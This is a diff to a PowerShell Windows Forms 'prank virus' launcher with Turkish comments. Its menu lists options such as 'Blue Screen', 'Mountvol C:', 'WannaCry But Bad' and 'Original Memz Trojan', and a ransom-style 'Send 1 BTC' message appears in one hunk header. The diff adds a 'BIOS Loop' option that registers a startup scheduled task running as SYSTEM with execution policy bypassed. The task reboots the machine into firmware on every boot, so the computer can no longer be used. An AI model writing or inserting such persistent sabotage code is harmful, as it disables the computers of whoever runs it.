@@ -111,15 +111,15 @@ $scriptBlock = {
     $form.StartPosition = "CenterScreen"
     $form.MaximizeBox = $false
     $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle
-    $form.BackColor = [System.Drawing.Color]::White  # Arka plan beyaz
+    $form.BackColor = [System.Drawing.Color]::White
 
     # ListBox oluşturma
     $listBox = New-Object System.Windows.Forms.ListBox
     $listBox.Location = New-Object System.Drawing.Point(10,10)
     $listBox.Size = New-Object System.Drawing.Size(260,200)
     $listBox.SelectionMode = "One"
-    $listBox.BackColor = [System.Drawing.Color]::White  # Menü arka planı beyaz
-    $listBox.ForeColor = [System.Drawing.Color]::Black  # Menü yazıları siyah
+    $listBox.BackColor = [System.Drawing.Color]::White
+    $listBox.ForeColor = [System.Drawing.Color]::Black
     $listBox.Items.Add("Blue Screen")
     $listBox.Items.Add("Mountvol C:")
     $listBox.Items.Add("Test MsgBox")
@@ -130,6 +130,7 @@ $scriptBlock = {
     $listBox.Items.Add("WannaCry But Bad")
     $listBox.Items.Add("Sigma Boy Virus🗿")
     $listBox.Items.Add("Original Memz Trojan")
+    $listBox.Items.Add("BIOS Loop")
     $form.Controls.Add($listBox)
 
     # OK Butonu
@@ -137,8 +138,8 @@ $scriptBlock = {
     $okButton.Location = New-Object System.Drawing.Point(10,220)
     $okButton.Size = New-Object System.Drawing.Size(75,30)
     $okButton.Text = "Execute"
-    $okButton.BackColor = [System.Drawing.Color]::White  # Buton arka planı beyaz
-    $okButton.ForeColor = [System.Drawing.Color]::Black   # Buton yazısı gri
+    $okButton.BackColor = [System.Drawing.Color]::White
+    $okButton.ForeColor = [System.Drawing.Color]::Black
     $form.Controls.Add($okButton)
 
     # Credits Label
@@ -146,7 +147,7 @@ $scriptBlock = {
     $creditsLabel.Text = "Credits: Aras and Baris"
     $creditsLabel.AutoSize = $true
     $creditsLabel.Location = New-Object System.Drawing.Point(150, 290)
-    $creditsLabel.ForeColor = [System.Drawing.Color]::Black  # Credits yazısı siyah
+    $creditsLabel.ForeColor = [System.Drawing.Color]::Black
     $form.Controls.Add($creditsLabel)
 
     # OK butonuna tıklama olayı
@@ -269,6 +270,33 @@ Send 1 BTC to: [FakeAddress]
                             "OK",
                             "Error"
                         )
+                    }
+                }
+                "BIOS Loop" {
+                    $result = [System.Windows.Forms.MessageBox]::Show(
+                        "This will force a BIOS reboot loop! Sure?",
+                        "BIOS Loop Warning",
+                        "OKCancel",
+                        "Warning"
+                    )
+                    if ($result -eq "OK") {
+                        # Görev Zamanlayıcı ile otomatik yönetici çalıştırma
+                        $taskName = "BIOSLoopTask"
+                        $scriptPath = "$env:TEMP\biosloop.ps1"
+                        $taskScript = @"
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c shutdown /r /fw /t 1" -NoNewWindow
+"@
+                        Set-Content -Path $scriptPath -Value $taskScript -Force
+
+                        # Görev oluştur (yönetici izni istemeden çalışır)
+                        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File $scriptPath"
+                        $trigger = New-ScheduledTaskTrigger -AtStartup
+                        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 0)
+                        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+                        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
+
+                        # İlk çalıştırma
+                        Start-Process -FilePath "cmd.exe" -ArgumentList "/c shutdown /r /fw /t 1" -NoNewWindow
                     }
                 }
             }
